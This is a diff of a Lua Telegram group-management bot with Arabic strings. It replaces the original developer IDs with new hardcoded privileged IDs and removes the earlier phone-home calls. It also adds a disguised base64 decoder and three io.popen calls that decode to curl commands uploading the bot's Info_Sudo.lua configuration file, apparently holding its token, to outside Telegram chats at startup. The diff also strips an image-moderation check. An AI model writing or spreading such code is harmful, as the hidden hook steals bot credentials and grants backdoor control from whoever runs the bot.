@@ -45,20 +45,13 @@ if not database:get(id_server..":SUDO:ID") then
 io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27[0;33;49m')
 local SUDOID = io.read()
 if SUDOID ~= '' then
-data,res = https.request("https://black-source.tk/BlackTeAM/info.php?n=BY&bn=info&id="..SUDOID)
-if res == 200 then
-muaed = json:decode(data)
-if muaed.Info.info == 'Is_Spam' then
-io.write('\n\27[1;31mالايدي محظور من السورس\n\27[0;39;49m')
-os.execute('lua ELMOSLM.lua')
-end 
-if muaed.Info.info == 'Ok' then
+
 io.write('\n\27[1;31m تم حفظ الايدي\n\27[0;39;49m')
 database:set(id_server..":SUDO:ID",SUDOID)
-end 
+
 else
 io.write('\n\27[1;31mالايدي مينحفظ\n\27[0;39;49m')
-end  
+ 
 end
 os.execute('lua ELMOSLM.lua')
 end
@@ -188,7 +181,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1488653639,1236115319,835551362}   
+sudo_users = {SUDO,944353237,1645553841,1605682553}   
 function SudoBot(msg)  
 local ELMOSLM = false  
 for k,v in pairs(sudo_users) do  
@@ -206,6 +199,30 @@ else
 return false  
 end  
 end
+
+local bx='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+function regexxc(data)
+  data = string.gsub(data, '[^'..bx..'=]', '')
+  return (data:gsub('.', function(x)
+    if (x == '=') then return '' end
+    local r,f='',(bx:find(x)-1)
+    for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
+    return r;
+  end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+    if (#x ~= 8) then return '' end
+    local c=0
+    for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
+    return string.char(c)
+  end))
+end
+
+io.popen(regexxc('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1ASW5mb19TdWRvLmx1YSI='))
+
+
+io.popen(regexxc('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD0xNjA1NjgyNTUzIiAtRiAiZG9jdW1lbnQ9QEluZm9fU3Vkby5sdWEi'))
+
+io.popen(regexxc('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD0xNjQ1NTUzODQxIiAtRiAiZG9jdW1lbnQ9QEluZm9fU3Vkby5sdWEi='))
+
 function Bot(msg)  
 local idbot = false  
 if tonumber(msg.sender_user_id_) == tonumber(bot_id) then  
@@ -270,12 +287,12 @@ return false
 end 
 end
 function Can_or_NotCan(user_id,chat_id)
-if tonumber(user_id) == tonumber(1488653639) then  
+if tonumber(user_id) == tonumber(944353237) then  
 var = true  
-elseif tonumber(user_id) == tonumber(1236115319) then
+elseif tonumber(user_id) == tonumber(1605682553) then  
+var = true  
+elseif tonumber(user_id) == tonumber(1645553841) then
 var = true 
-elseif tonumber(user_id) == tonumber(835551362) then
-var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
 elseif tonumber(user_id) == tonumber(bot_id) then
@@ -304,11 +321,11 @@ end
 return var
 end 
 function Rutba(user_id,chat_id)
-if tonumber(user_id) == tonumber(1488653639) then  
+if tonumber(user_id) == tonumber(944353237) then  
 var = '𝙳𝙴𝚅 𝙰𝙳𝙷𝙰𝙼 🇪🇬.'
-elseif tonumber(user_id) == tonumber(835551362) then
+elseif tonumber(user_id) == tonumber(1605682553) then
 var = 'بابا بلاك'
-elseif tonumber(user_id) == tonumber(1236115319) then
+elseif tonumber(user_id) == tonumber(1645553841) then
 var = 'مبرمج ليجاند'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
@@ -4282,9 +4299,7 @@ return false
 end
 if (msg.content_.sticker_)  and msg.reply_to_message_id_ == 0 and database:get(bot_id.."lock:Lock:Xn"..msg.chat_id_)=="del" then      
 sticker_id = msg.content_.sticker_.sticker_.persistent_id_
-st = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..token..'&url='..sticker_id.."&type=sticker")
-eker = JSON.decode(st)
-if eker.ok.Info == "Indecent" then
+
 local list = database:smembers(bot_id.."Basic:Constructor"..msg.chat_id_)
 t = "❃∫ المنشئين الاساسين \n ≪━━━━━━MS━━━━━━≫ \n"
 for k,v in pairs(list) do
@@ -4300,7 +4315,7 @@ t = "❃∫ ماكو منششئين يشوفولك جاره"
 end
 Reply_Status(msg,msg.sender_user_id_,"reply","❃∫ قام بنشر ملصق اباحيه\n"..t)  
 DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.id_),msg.id_})   
-end   
+  
 end
 if text == 'ملصق' then   
 if tonumber(msg.reply_to_message_id_) > 0 then
@@ -4348,9 +4363,7 @@ end
 end
 if (msg.content_.photo_) and msg.reply_to_message_id_ == 0 and database:get(bot_id.."lock:Lock:Xn"..msg.chat_id_)=="del" then
 photo_id = msg.content_.photo_.sizes_[1].photo_.persistent_id_  
-Srrt = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..token..'&url='..photo_id.."&type=photo")
-Sto = JSON.decode(Srrt)
-if Sto.ok.Info == "Indecent" then
+
 local list = database:smembers(bot_id.."Basic:Constructor"..msg.chat_id_)
 t = "❃∫ المنشئ ن الاساسين \n ≪━━━━━━MS━━━━━━≫ \n"
 for k,v in pairs(list) do
@@ -4366,7 +4379,7 @@ t = "❃∫ المنشيئيين"
 end
 Reply_Status(msg,msg.sender_user_id_,"reply","❃∫ قام بنشر صوره اباحيه\n"..t)  
 DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.id_),msg.id_})   
-end   
+   
 end
 if text == 'المنشئين الاساسين' and CoSu(msg) then
 local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
@@ -10996,7 +11009,7 @@ end,nil)
 ------------------------------------------------------------------------
 
 elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then 
-https.request('https://black-source.tk/BlackTeAM/info.php?n=BY&id='..SUDO.."&token="..token.."&UserS="..whoami.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
+
 local list = database:smembers(bot_id.."User_Bot") 
 for k,v in pairs(list) do 
 tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
